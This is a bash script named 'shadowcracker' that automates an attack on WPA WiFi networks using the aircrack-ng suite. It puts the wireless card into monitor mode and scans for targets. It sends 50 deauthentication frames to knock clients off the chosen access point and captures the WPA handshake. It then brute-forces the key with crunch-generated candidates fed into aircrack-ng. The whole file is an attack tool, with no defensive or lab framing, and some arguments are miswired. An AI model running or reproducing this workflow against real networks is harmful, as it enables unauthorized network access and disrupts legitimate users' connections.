 #!/bin/bash
############################
#	shadowcracker      #
#	made by dotwavD    #
############################
bssid=""
wpa=""
channel=""
echo "Welcome to the cracking program"
airmon-ng check kill
airmon-ng start wlan0
echo "Press Cntrl c when done and remember the channel and copy he bssid"
sleep 5
airodump-ng wlan0mon
echo "Enter the bssid:"
read bssid
echo "Enter the channel:"
read channel
echo "You need to wait for a wpa and copy it and enter in the terminal"
sleep 4
aireplay-ng --deauth 50 -a $bssid wlan0mon
airodump-ng -c $channel --bssid $bssid -w /root/Desktop/ wlan0mon
echo "Enter the Wpa handshake."
read wpa
crunch 13 13 -f /usr/share/rainbowcrack/charset.txt alpha-numeric -t 3HW14%W@0%%%% | aircrack-ng -a2 -b $wpa -w - /root/Desktop/*.cap
airmon-ng stop wlan0
airmon-ng stop wlan0mon
NetworkManager restart
